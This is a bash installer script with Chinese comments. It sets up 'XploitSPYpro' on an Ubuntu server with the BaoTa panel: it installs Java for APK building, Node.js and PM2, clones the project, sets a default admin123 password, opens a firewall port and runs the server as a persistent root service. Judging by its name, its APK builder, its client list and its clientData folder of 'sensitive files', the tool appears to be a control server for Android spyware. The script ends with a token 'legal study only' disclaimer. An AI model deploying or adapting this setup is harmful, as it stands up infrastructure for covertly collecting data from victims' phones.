#!/bin/bash
#
# XploitSPYpro 宝塔面板一键安装脚本
# 适用于 Ubuntu 22.04 + 宝塔面板环境
#
# 使用方法:
#   wget https://raw.githubusercontent.com/dg49888safe/XploitSPYpro/main/install.sh
#   chmod +x install.sh
#   sudo ./install.sh
#

set -e

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 配置项
INSTALL_DIR="/www/wwwroot/xploitspy"
GIT_REPO="https://github.com/dg49888safe/XploitSPYpro.git"
NODE_VERSION="16"
SERVICE_PORT="8080"

# 打印信息函数
print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# 检查 root 权限
check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "请使用 root 用户运行此脚本"
        exit 1
    fi
}

# 检查系统
check_system() {
    if [[ ! -f /etc/os-release ]]; then
        print_error "无法识别操作系统"
        exit 1
    fi

    source /etc/os-release
    if [[ "$ID" != "ubuntu" ]] || [[ "$VERSION_ID" != "22.04" ]]; then
        print_warning "此脚本针对 Ubuntu 22.04 设计，当前系统: $PRETTY_NAME"
        read -p "是否继续安装? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
    fi
}

# 检查宝塔面板
check_bt_panel() {
    if [[ -f /etc/init.d/bt ]] || [[ -d /www/server/panel ]]; then
        print_success "检测到宝塔面板已安装"
        BT_INSTALLED=true
    else
        print_warning "未检测到宝塔面板"
        BT_INSTALLED=false
        read -p "是否继续安装? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
    fi
}

# 安装基础依赖
install_deps() {
    print_info "正在安装基础依赖..."
    apt-get update
    apt-get install -y curl git build-essential unzip wget
    print_success "基础依赖安装完成"
}

# 安装 Java
install_java() {
    print_info "正在安装 OpenJDK 11 (APK构建必需)..."
    if java -version 2>&1 | grep -q "version \"11"; then
        print_success "Java 11 已安装，跳过"
    else
        apt-get install -y openjdk-11-jdk
        print_success "Java 11 安装完成"
    fi
    java -version
}

# 安装 Node.js
install_nodejs() {
    print_info "正在安装 Node.js ${NODE_VERSION}..."
    
    # 检查是否已安装 nvm
    export NVM_DIR="$HOME/.nvm"
    if [[ -s "$NVM_DIR/nvm.sh" ]]; then
        source "$NVM_DIR/nvm.sh"
    else
        print_info "安装 nvm..."
        curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
        source "$NVM_DIR/nvm.sh"
    fi

    # 安装 Node.js
    nvm install ${NODE_VERSION}
    nvm use ${NODE_VERSION}
    nvm alias default ${NODE_VERSION}
    
    print_success "Node.js 安装完成"
    node -v
    npm -v
}

# 安装 PM2
install_pm2() {
    print_info "正在安装 PM2 进程管理器..."
    npm install -g pm2
    print_success "PM2 安装完成"
}

# 拉取项目代码
clone_project() {
    print_info "正在拉取项目代码..."
    
    # 如果目录已存在，备份后删除
    if [[ -d "$INSTALL_DIR" ]]; then
        print_warning "目标目录已存在，正在备份..."
        mv "$INSTALL_DIR" "${INSTALL_DIR}.backup.$(date +%Y%m%d%H%M%S)"
    fi
    
    mkdir -p "$INSTALL_DIR"
    git clone "$GIT_REPO" "$INSTALL_DIR"
    
    print_success "项目代码拉取完成"
}

# 安装项目依赖
install_project_deps() {
    print_info "正在安装项目依赖..."
    cd "$INSTALL_DIR"
    
    # 安装根目录依赖
    npm install --production
    
    # 安装服务端依赖
    cd server
    npm install --production
    cd ..
    
    print_success "项目依赖安装完成"
}

# 修改默认密码
change_default_password() {
    print_info "设置管理员密码..."
    
    # 生成随机密码或让用户输入
    read -sp "请输入新的管理员密码 (默认: admin123): " NEW_PASS
    echo
    
    if [[ -z "$NEW_PASS" ]]; then
        NEW_PASS="admin123"
        print_warning "使用默认密码: $NEW_PASS"
        print_warning "请务必在安装完成后修改!"
    fi
    
    # 生成 MD5
    NEW_PASS_MD5=$(echo -n "$NEW_PASS" | md5sum | awk '{print $1}')
    
    # 修改数据库文件
    cat > "$INSTALL_DIR/server/maindb.json" <<EOF
{
  "admin": {
    "username": "admin",
    "password": "${NEW_PASS_MD5}",
    "loginToken": "",
    "logs": [],
    "ipLog": []
  },
  "clients": []
}
EOF
    
    # 保存密码信息
    echo "管理员账号: admin" > "$INSTALL_DIR/admin_credentials.txt"
    echo "管理员密码: $NEW_PASS" >> "$INSTALL_DIR/admin_credentials.txt"
    echo "设置时间: $(date)" >> "$INSTALL_DIR/admin_credentials.txt"
    chmod 600 "$INSTALL_DIR/admin_credentials.txt"
    
    print_success "管理员密码已设置"
}

# 修改监听端口
configure_port() {
    print_info "配置服务端口..."
    
    read -p "请输入服务端口 (默认: 8080): " INPUT_PORT
    if [[ -n "$INPUT_PORT" ]]; then
        SERVICE_PORT=$INPUT_PORT
    fi
    
    # 修改 const.js
    sed -i "s/exports.web_port = 80;/exports.web_port = ${SERVICE_PORT};/g" "$INSTALL_DIR/server/includes/const.js"
    
    print_success "服务端口设置为: $SERVICE_PORT"
}

# 启动服务
start_service() {
    print_info "正在启动服务..."
    cd "$INSTALL_DIR"
    
    # 使用 PM2 启动
    PORT=$SERVICE_PORT pm2 start server/index.js --name "xploitspy"
    pm2 save
    
    # 设置开机自启
    pm2 startup systemd -u root --hp /root
    
    print_success "服务已启动"
}

# 配置防火墙
configure_firewall() {
    print_info "配置防火墙..."
    
    if command -v ufw >/dev/null 2>&1; then
        ufw allow ${SERVICE_PORT}/tcp
        print_success "已开放端口 $SERVICE_PORT"
    elif command -v firewall-cmd >/dev/null 2>&1; then
        firewall-cmd --permanent --add-port=${SERVICE_PORT}/tcp
        firewall-cmd --reload
        print_success "已开放端口 $SERVICE_PORT"
    else
        print_warning "未检测到防火墙工具，请手动开放端口 $SERVICE_PORT"
    fi
}

# 宝塔面板特别配置
configure_bt_panel() {
    if [[ "$BT_INSTALLED" == true ]]; then
        print_info "=========================================="
        print_info "宝塔面板配置提示:"
        print_info "=========================================="
        echo ""
        print_info "1. 登录宝塔面板 -> 网站 -> 添加站点"
        print_info "2. 域名填写你的域名或服务器IP"
        print_info "3. 创建成功后点击 '设置' -> '反向代理'"
        print_info "4. 添加反向代理:"
        echo "   代理名称: xploitspy"
        echo "   目标URL: http://127.0.0.1:${SERVICE_PORT}"
        print_info "5. 开启 WebSocket 支持 (在反向代理高级设置中)"
        print_info "6. 如需HTTPS: 在SSL中申请Let's Encrypt证书"
        echo ""
        print_info "或者使用宝塔的Node项目功能:"
        print_info "- 在 /www/wwwroot/xploitspy 目录已就绪"
        print_info "- 可在宝塔 Node 项目中直接管理此服务"
        echo ""
    fi
}

# 打印安装信息
print_install_info() {
    local IP=$(curl -s ifconfig.me || echo "你的服务器IP")
    
    echo ""
    echo "=========================================="
    print_success "XploitSPYpro 安装完成!"
    echo "=========================================="
    echo ""
    echo -e "📍 安装目录: ${GREEN}$INSTALL_DIR${NC}"
    echo -e "🌐 访问地址: ${GREEN}http://$IP:$SERVICE_PORT${NC}"
    echo -e "🔧 服务端口: ${GREEN}$SERVICE_PORT${NC}"
    echo ""
    echo "📋 管理员账号: admin"
    echo "📋 管理员密码: 见 $INSTALL_DIR/admin_credentials.txt"
    echo ""
    echo "🛠️ 常用命令:"
    echo "   pm2 logs xploitspy    # 查看日志"
    echo "   pm2 restart xploitspy # 重启服务"
    echo "   pm2 stop xploitspy    # 停止服务"
    echo "   pm2 start xploitspy   # 启动服务"
    echo ""
    echo "⚠️  安全提示:"
    echo "   1. 首次登录后请修改默认密码"
    echo "   2. 建议使用 HTTPS (配置域名和SSL)"
    echo "   3. 定期清理 $INSTALL_DIR/server/clientData/ 中的敏感文件"
    echo ""
    
    if [[ "$BT_INSTALLED" == true ]]; then
        echo "🔧 宝塔用户: 建议配置反向代理 + SSL，详见上方配置提示"
        echo ""
    fi
    
    print_warning "⚠️  仅限内部合法学习使用，严禁外传或用于非法用途!"
    echo "=========================================="
}

# 主函数
main() {
    clear
    echo "=========================================="
    echo "   XploitSPYpro 宝塔面板一键安装脚本"
    echo "   适用系统: Ubuntu 22.04"
    echo "=========================================="
    echo ""
    
    check_root
    check_system
    check_bt_panel
    
    print_info "安装即将开始，请确保:"
    echo "  - 服务器内存 >= 512MB"
    echo "  - 磁盘空间 >= 2GB"
    echo "  - 网络连接正常"
    echo ""
    read -p "按 Enter 键开始安装，或 Ctrl+C 取消..."
    
    install_deps
    install_java
    install_nodejs
    install_pm2
    clone_project
    install_project_deps
    change_default_password
    configure_port
    start_service
    configure_firewall
    configure_bt_panel
    print_install_info
}

# 错误处理
trap 'print_error "安装过程中出现错误，请检查日志"; exit 1' ERR

# 运行主函数
main
